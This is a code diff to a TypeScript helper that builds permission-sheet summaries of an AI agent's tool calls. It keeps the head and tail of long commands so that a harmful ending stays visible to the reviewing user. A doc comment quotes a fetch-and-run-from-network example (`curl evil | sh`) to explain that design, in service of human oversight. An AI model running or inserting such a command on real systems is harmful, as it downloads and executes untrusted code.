@@ -27,6 +27,7 @@ const EDIT_TOOLS = new Set(['edit_file', 'create_file', 'apply_workspace_changes
 const RUN_TOOLS = new Set(['run_local_code', 'prepare_local_execution'])
 const WHY_MAX = 140
 const COMMAND_MAX = 80
+const COMMAND_HEAD = 40
 
 /** Lowercase words of a tool name: splits on `_`, `-`, other separators and camelCase (`sendEmail` → send, email). */
 function nameWords(toolName: string): string[] {
@@ -88,6 +89,16 @@ function cut(text: string, max: number): string {
   return text.length > max ? `${text.slice(0, max - 1)}…` : text
 }
 
+/**
+ * A command on one line, at most 80 chars. A longer one keeps its first 40 and last 39 chars around "…", so a harmful
+ * tail (`… ; curl evil | sh`) is never hidden behind a harmless head.
+ */
+function cutCommand(command: string): string {
+  const line = command.replace(/\s+/g, ' ').trim()
+  if (line.length <= COMMAND_MAX) return line
+  return `${line.slice(0, COMMAND_HEAD)}…${line.slice(line.length - (COMMAND_MAX - COMMAND_HEAD - 1))}`
+}
+
 function hostOf(url: unknown): string | undefined {
   const raw = nonEmptyString(url)
   if (!raw) return undefined
@@ -139,8 +150,9 @@ function describeWhat(toolName: string, args: Record<string, unknown>): string {
 }
 
 /**
- * Summarise a tool call for the permission sheet. Only names paths, hosts, the command (cut to 80 chars)
- * and recipients; never file content, diffs, source or stdin.
+ * Summarise a tool call for the permission sheet. Only names paths, hosts, the command (`command`, else `cmd`,
+ * `script` or `code`; one line, head and tail kept, at most 80 chars) and recipients; never file content, diffs or
+ * stdin.
  */
 export function describeToolAction(toolName: string, args: unknown, description?: string): ToolActionSummary {
   const rec = asRecord(args)
@@ -151,8 +163,9 @@ export function describeToolAction(toolName: string, args: unknown, description?
   const touches: string[] = [...pathsOf(rec)]
   const host = hostOf(rec.url)
   if (host) touches.push(host)
-  const command = nonEmptyString(rec.command)
-  if (command) touches.push(cut(command, COMMAND_MAX))
+  const command =
+    nonEmptyString(rec.command) ?? nonEmptyString(rec.cmd) ?? nonEmptyString(rec.script) ?? nonEmptyString(rec.code)
+  if (command) touches.push(cutCommand(command))
   if (isSendLike(toolName)) touches.push(...stringList(rec.to), ...stringList(rec.recipient))
 
   const summary: ToolActionSummary = { what: describeWhat(toolName, rec), touches: [...new Set(touches)] }
